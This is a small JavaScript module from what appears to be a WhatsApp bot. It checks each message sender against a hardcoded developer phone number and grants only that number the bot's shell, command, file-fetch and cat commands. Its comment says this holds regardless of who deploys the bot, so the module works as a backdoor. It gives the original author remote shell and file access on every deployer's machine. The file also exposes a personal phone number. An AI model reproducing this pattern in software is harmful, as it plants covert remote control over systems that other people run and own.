/**
 * utils/isDev.js
 * ----------------
 * Restricts access to the bot's original developer only (hardcoded),
 * regardless of who owns/deploys this instance of the bot.
 * Used for high-risk commands: shell, getcmd, getfile, cat.
 */
const DEV_NUMBER = '254754574642';

function isDev(msg) {
  const senderJid = msg.key.participantPn || msg.key.participant || msg.key.remoteJid;
  const senderNumber = senderJid.split('@')[0].split(':')[0];
  return senderNumber === DEV_NUMBER;
}

module.exports = { isDev };
